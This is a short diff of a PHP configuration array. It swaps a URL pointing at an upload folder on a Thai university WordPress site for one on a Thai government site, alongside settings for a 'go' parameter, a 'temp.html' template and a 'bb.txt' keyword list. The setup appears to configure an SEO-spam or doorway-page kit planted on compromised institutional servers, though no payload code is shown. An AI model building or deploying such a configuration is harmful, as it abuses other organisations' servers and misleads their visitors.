@@ -1,6 +1,6 @@
 <?php
 $config = array(
-        'url'		=> 'https://nurse.sskru.ac.th/wordpress/well-known/upload/',
+        'url'		=> 'http://amssspmphrae.sesa37.go.th/amssplus/upload/',
         'parameter' => 'go',
         'template'  => 'temp.html',
         'keywords'  => 'bb.txt',
